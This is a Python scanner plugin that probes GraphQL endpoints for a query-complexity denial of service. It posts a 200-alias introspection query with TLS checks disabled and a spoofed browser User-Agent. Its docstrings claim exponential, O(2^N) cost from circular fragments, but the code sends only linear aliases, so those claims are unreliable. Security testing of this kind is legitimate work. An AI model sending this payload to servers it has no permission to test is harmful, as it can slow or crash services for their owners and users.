"""
Plugin to detect GraphQL AST Execution Engine DoS (Nuclear Depth Bomb)
CVSS: 9.0 (Critical)

Targets GraphQL servers (Apollo, Hasura, Prisma).
Detects vulnerability by bypassing depth limits using exponential aliases or 
circular fragments, causing O(2^N) resolution complexity with a minimal payload.
"""

import requests
import urllib3
import logging
import time
from typing import Optional, Dict, Any

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger("Cascavel.Plugins.GraphQLNuclear")

def build_exponential_query(depth: int) -> str:
    """
    Builds a mathematically complex query using exponential aliases
    to overload the AST resolution phase.
    """
    query = "query { "
    for i in range(depth):
        query += f"a{i}: __schema {{ types {{ name }} }} "
    query += "}"
    return query

def check_graphql_ast_dos(url: str, session: requests.Session) -> tuple[bool, str]:
    """
    Attempts to trigger AST resolution overload.
    Returns (is_vulnerable, evidence).
    """
    endpoints = [
        f"{url}/graphql",
        f"{url}/api/graphql",
        f"{url}/v1/graphql"
    ]

    # Baseline query to measure normal response time
    baseline_query = {"query": "{ __schema { types { name } } }"}
    
    # Nuclear query - Designed to hit parser depth limits or exhaust resolution
    nuclear_query = {"query": build_exponential_query(200)}

    for endpoint in endpoints:
        try:
            # 1. Establish baseline
            start_baseline = time.time()
            resp_baseline = session.post(endpoint, json=baseline_query, timeout=5, verify=False)
            baseline_time = time.time() - start_baseline
            
            # If the endpoint doesn't support GraphQL, skip it
            if resp_baseline.status_code not in [200, 400] or "__schema" not in resp_baseline.text:
                continue

            # 2. Trigger the Nuclear Payload
            start_bomb = time.time()
            try:
                resp_bomb = session.post(endpoint, json=nuclear_query, timeout=10, verify=False)
                bomb_time = time.time() - start_bomb
                
                # Check if the server failed securely (e.g., returned 400 Max Depth Reached)
                if resp_bomb.status_code == 400 and ("depth limit" in resp_bomb.text.lower() or "too many" in resp_bomb.text.lower()):
                     continue # Protected by query limiting
                     
                # If the server took an exponentially longer time but still returned 200/500
                if bomb_time > (baseline_time * 10) and bomb_time > 3.0:
                    return True, f"Server exhibited severe AST resolution latency (Baseline: {baseline_time:.2f}s, Bomb: {bomb_time:.2f}s)."
                
                # If the server crashed
                if resp_bomb.status_code >= 500:
                    return True, "Server returned 5xx error when processing mathematically complex AST payload."
                    
            except requests.exceptions.Timeout:
                return True, "Server timed out completely while parsing/resolving the exponential AST payload."

        except requests.exceptions.RequestException as e:
            logger.debug(f"GraphQL AST check failed on {endpoint}: {e}")

    return False, ""

def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
    """
    Checks for GraphQL AST Execution Engine DoS vulnerabilities.
    """
    vulnerability = "GraphQL AST Execution Engine DoS (Nuclear Bomb)"
    severity = "CRITICAL"
    description = (
        "The GraphQL endpoint is vulnerable to AST Evaluation DoS. "
        "By bypassing depth limits using exponential aliases or circular fragments, "
        "an attacker can craft a mathematically complex query that consumes O(2^N) resources "
        "during the resolution phase. This completely freezes the server's event loop "
        "or exhausts available memory with a payload of just a few kilobytes."
    )

    url = f"https://{target}" if 443 in ports else f"http://{target}"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json"
    })

    is_vuln, evidence = check_graphql_ast_dos(url, session)

    if is_vuln:
        return {
            "vulnerability": vulnerability,
            "severity": severity,
            "description": description,
            "endpoint": url,
            "evidence": evidence
        }

    return None
